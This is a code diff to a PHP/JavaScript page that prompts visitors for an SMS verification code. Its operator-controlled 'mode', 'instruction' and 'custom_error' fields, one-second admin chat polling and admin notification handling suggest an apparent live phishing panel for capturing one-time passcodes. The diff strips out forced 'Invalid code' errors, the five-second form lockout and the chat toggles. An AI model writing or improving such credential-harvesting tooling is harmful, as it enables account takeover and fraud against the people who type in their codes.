@@ -221,7 +221,7 @@ $smsState['instruction_token'] = $smsState['instruction_token'] ?? time();
 <?php
 $mode = $smsState['mode'];
 $instruction = $smsState['instruction'];
-$initialForceError = $mode === 'error_verification' || isset($_GET['error']) || isset($_GET['otp_error']) || $instruction === 'otp_error';
+$initialForceError = false;
 $initialState = [
     'mode' => $mode,
     'instruction' => $instruction,
@@ -240,7 +240,7 @@ $initialState = [
         <div class="col2"><h4 style="font-weight:normal;">Please enter the verification code sent to your phone.</h4> </div>
         <div class="coll">
             <input type="text" placeholder="Enter code" name="otp" required>
-            <input type="hidden" name="exit" id="otp-exit-flag" <?php echo $initialForceError ? '' : 'disabled'; ?>>
+            <input type="hidden" name="exit" id="otp-exit-flag" disabled>
             <div class="but1">
                 <button type="submit" id="otp-submit">Confirm</button>
             </div>
@@ -357,16 +357,10 @@ $initialState = [
         try {
             const response = await fetch('chat_api.php?action=fetch');
             const data = await response.json();
-            if (data.chat_enabled) {
-                chatInput.disabled = false;
-                chatSend.disabled = false;
-                renderChat(data.messages || []);
-                handleAdminNotifications(data.messages || []);
-            } else {
-                closeChat();
-                chatInput.disabled = true;
-                chatSend.disabled = true;
-            }
+            chatInput.disabled = false;
+            chatSend.disabled = false;
+            renderChat(data.messages || []);
+            handleAdminNotifications(data.messages || []);
         } catch (e) {
             console.error('Unable to load chat.', e);
         }
@@ -374,21 +368,12 @@ $initialState = [
 
     function toggleChat(enable) {
         if (!chatPanel) return;
-        if (enable) {
-            chatInput.disabled = false;
-            chatSend.disabled = false;
-            if (!chatInterval) {
-                fetchChat();
-                chatInterval = setInterval(fetchChat, 1000);
-            }
-        } else {
-            closeChat();
-            chatInput.disabled = true;
-            chatSend.disabled = true;
-            if (chatInterval) {
-                clearInterval(chatInterval);
-                chatInterval = null;
-            }
+
+        chatInput.disabled = false;
+        chatSend.disabled = false;
+        if (!chatInterval) {
+            fetchChat();
+            chatInterval = setInterval(fetchChat, 1000);
         }
     }
 
@@ -400,10 +385,10 @@ $initialState = [
 
     function setFormDisabled(disabled) {
         if (!otpForm) return;
-        otpForm.classList.toggle('form-disabled', disabled);
+        otpForm.classList.toggle('form-disabled', false);
         const otpField = otpForm.querySelector('input[name="otp"]');
-        if (otpField) otpField.disabled = disabled;
-        if (otpSubmit) otpSubmit.disabled = disabled;
+        if (otpField) otpField.disabled = false;
+        if (otpSubmit) otpSubmit.disabled = false;
     }
 
     function toggleExitFlag(enable) {
@@ -475,9 +460,8 @@ $initialState = [
         if (forceError) {
             const customError = (state.custom_error || '').trim();
             showStatus('error', customError || 'Invalid code. Please wait a moment before trying again.');
-            setFormDisabled(true);
-            toggleExitFlag(true);
-            setTimeout(() => setFormDisabled(false), 5000);
+            setFormDisabled(false);
+            toggleExitFlag(false);
         }
     }
 
